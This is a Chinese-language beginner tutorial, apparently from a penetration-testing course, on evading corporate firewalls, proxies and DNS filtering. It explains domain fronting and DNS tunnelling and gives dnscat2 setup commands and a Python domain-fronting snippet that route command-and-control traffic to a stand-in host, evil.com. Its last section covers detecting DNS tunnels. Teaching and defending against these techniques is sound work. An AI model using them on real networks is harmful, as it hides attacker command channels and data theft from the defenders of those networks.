# 网络过滤绕过 - 新手章节指南

## 这个目录是干什么的？

企业网络通常有防火墙、代理、IDS/IPS 等网络安全设备。这个目录教你如何让你的流量绕过这些检测和过滤。

---

## 为什么要学这个？

```
现实情况：
├── 企业有防火墙，只开放特定端口
├── 有代理服务器，监控所有 HTTP 流量
├── 有 IDS/IPS，检测恶意流量
├── 有 DNS 过滤，阻止恶意域名
└── 你的 C2 流量可能被拦截

学习目的：
├── 理解网络安全设备的工作原理
├── 学会伪装恶意流量
├── 让 C2 通信绕过检测
└── 保持持久访问
```

---

## 通俗理解核心概念

### 网络过滤的类型

```
1. 端口过滤（防火墙）
├── 只允许特定端口通信
├── 比如只开放 80、443
├── 其他端口被阻止
└── 绕过：使用允许的端口

2. 内容过滤（代理/IDS）
├── 检查流量内容
├── 发现恶意特征就阻止
├── 比如检测 Shellcode 特征
└── 绕过：加密、混淆流量

3. DNS 过滤
├── 阻止访问恶意域名
├── 基于黑名单
├── 或基于信誉评分
└── 绕过：使用合法域名、DNS 隧道
```

### 什么是域前置（Domain Fronting）？

```
域前置 = 利用 CDN 隐藏真实目标

原理：
├── CDN（如 Cloudflare、Azure）托管很多网站
├── 你的 C2 服务器也在 CDN 后面
├── 流量看起来是访问合法网站
├── 但实际上到达你的 C2 服务器

类比：
├── 你要寄信给朋友（C2 服务器）
├── 但邮局会检查收件人
├── 你把信寄到一个大公司（CDN）
├── 大公司内部再转交给你朋友
└── 邮局只看到你寄给大公司

技术细节：
├── TLS SNI 显示合法域名
├── HTTP Host 头指向真实目标
├── 防火墙只能看到 SNI
└── 以为你在访问合法网站
```

### 什么是 DNS 隧道？

```
DNS 隧道 = 通过 DNS 协议传输数据

原理：
├── DNS 是必须开放的协议
├── 几乎所有网络都允许 DNS
├── 把数据编码到 DNS 查询中
├── 通过 DNS 服务器传输

类比：
├── 公司只允许打电话（DNS）
├── 不允许发邮件（其他协议）
├── 你把邮件内容用电话念出去
├── 虽然慢，但能传输数据

工作流程：
├── 客户端把数据编码成子域名
├── 查询 data.evil.com
├── DNS 服务器收到查询
├── 解码数据，返回响应
└── 响应中也可以包含数据
```

## 实操环境搭建

### DNS 隧道测试环境

```
你需要：
├── 一个域名（可以买便宜的）
├── 一台 VPS（作为 DNS 服务器）
├── dnscat2 或 iodine（DNS 隧道工具）
└── 内网测试机器

配置步骤：
1. 购买域名，比如 evil.com
2. 设置 NS 记录指向你的 VPS
3. 在 VPS 上运行 DNS 隧道服务端
4. 在目标机器上运行客户端
```

### 域前置测试环境

```
你需要：
├── 一个支持域前置的 CDN
├── 你的 C2 服务器
├── 配置好的 C2 框架

注意：
├── 很多 CDN 已经禁止域前置
├── Azure、AWS 等已经修复
├── 需要找到仍然支持的 CDN
└── 或使用其他替代技术
```

## 实践任务清单

### 任务1：理解 DNS 查询

```powershell
# 使用 nslookup 理解 DNS
nslookup google.com

# 查看详细信息
nslookup -debug google.com

# 指定 DNS 服务器
nslookup google.com 8.8.8.8
```

### 任务2：使用 dnscat2 建立 DNS 隧道

```bash
# 服务端（在你的 VPS 上）
# 安装 dnscat2
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
gem install bundler
bundle install

# 启动服务端
ruby dnscat2.rb evil.com

# 客户端（在目标机器上）
# 编译 dnscat2 客户端
cd dnscat2/client
make

# 连接
./dnscat --dns server=evil.com
```

### 任务3：理解域前置原理

```python
# 这是一个简化的域前置示例
# 展示 SNI 和 Host 头的区别

import ssl
import socket

# 创建 SSL 连接，SNI 设置为合法域名
context = ssl.create_default_context()
sock = socket.create_connection(('cdn.example.com', 443))
ssock = context.wrap_socket(sock, server_hostname='legitimate.com')

# 发送 HTTP 请求，Host 头设置为真实目标
request = b"GET / HTTP/1.1\r\nHost: evil.com\r\n\r\n"
ssock.send(request)

# 防火墙看到的是访问 legitimate.com
# 但实际请求到达 evil.com
```

### 任务4：检测 DNS 隧道

```
DNS 隧道的特征：
├── 大量 DNS 查询
├── 异常长的子域名
├── 高频率的 TXT 记录查询
├── 查询不存在的域名
└── 响应数据量异常大

防御方法：
├── 监控 DNS 查询频率
├── 检测异常长的域名
├── 限制 DNS 查询速率
└── 使用 DNS 安全解决方案
```
